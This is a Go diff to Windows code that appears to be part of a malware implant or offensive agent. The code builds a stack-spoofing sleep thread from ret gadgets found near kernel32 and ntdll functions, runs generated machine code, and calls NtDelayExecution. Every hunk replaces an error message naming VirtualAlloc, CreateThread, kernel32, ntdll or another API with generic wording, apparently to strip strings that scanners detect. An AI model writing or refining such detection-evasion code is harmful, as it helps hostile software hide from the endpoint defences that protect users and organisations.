@@ -112,7 +112,7 @@ func (s *stackSpoofState) init() error {
 	if err != nil {
 		windows.CloseHandle(sleepEvt)
 		windows.CloseHandle(doneEvt)
-		return fmt.Errorf("VirtualAlloc data: %w", err)
+		return fmt.Errorf("memory alloc data: %w", err)
 	}
 	s.dataAddr = dataAddr
 
@@ -124,7 +124,7 @@ func (s *stackSpoofState) init() error {
 		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
 		windows.CloseHandle(sleepEvt)
 		windows.CloseHandle(doneEvt)
-		return fmt.Errorf("VirtualAlloc spoof stack: %w", err)
+		return fmt.Errorf("memory alloc stack: %w", err)
 	}
 	s.spoofStackAddr = spoofStack
 
@@ -155,7 +155,7 @@ func (s *stackSpoofState) init() error {
 		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
 		windows.CloseHandle(sleepEvt)
 		windows.CloseHandle(doneEvt)
-		return fmt.Errorf("VirtualAlloc stub: %w", err)
+		return fmt.Errorf("memory alloc stub: %w", err)
 	}
 	// Copy stub code
 	stubSlice := unsafe.Slice((*byte)(unsafe.Pointer(stubAddr)), len(stub))
@@ -189,7 +189,7 @@ func (s *stackSpoofState) init() error {
 		windows.VirtualFree(dataAddr, 0, windows.MEM_RELEASE)
 		windows.CloseHandle(sleepEvt)
 		windows.CloseHandle(doneEvt)
-		return fmt.Errorf("CreateThread: %w", err)
+		return fmt.Errorf("thread creation: %w", err)
 	}
 
 	s.threadHandle = hThread
@@ -240,20 +240,20 @@ type spoofGadgets struct {
 func findSpoofGadgets() (*spoofGadgets, error) {
 	kernel32, err := windows.LoadDLL("kernel32.dll")
 	if err != nil {
-		return nil, fmt.Errorf("load kernel32: %w", err)
+		return nil, fmt.Errorf("load system library: %w", err)
 	}
 	ntdll, err := windows.LoadDLL("ntdll.dll")
 	if err != nil {
-		return nil, fmt.Errorf("load ntdll: %w", err)
+		return nil, fmt.Errorf("load system library (nt): %w", err)
 	}
 
 	waitAddr, err := kernel32.FindProc("WaitForSingleObject")
 	if err != nil {
-		return nil, fmt.Errorf("find WaitForSingleObject: %w", err)
+		return nil, fmt.Errorf("resolve wait function: %w", err)
 	}
 	setEvtAddr, err := kernel32.FindProc("SetEvent")
 	if err != nil {
-		return nil, fmt.Errorf("find SetEvent: %w", err)
+		return nil, fmt.Errorf("resolve event function: %w", err)
 	}
 
 	// Find ret gadgets (0xC3) near well-known functions
@@ -316,7 +316,7 @@ func findRetGadget(addr uintptr, skip, maxScan int) uintptr {
 // generateSleepStub generates x86-64 machine code for the dedicated sleep thread.
 // The stub loops: wait for signal → spoof stack → NtDelayExecution → restore → signal done.
 //
-// RCX (first param from CreateThread) = pointer to data block.
+// RCX (first param from thread creation) = pointer to data block.
 // The data block is mutable RW memory with event handles, gadget addresses, and timing.
 func generateSleepStub() []byte {
 	var code []byte
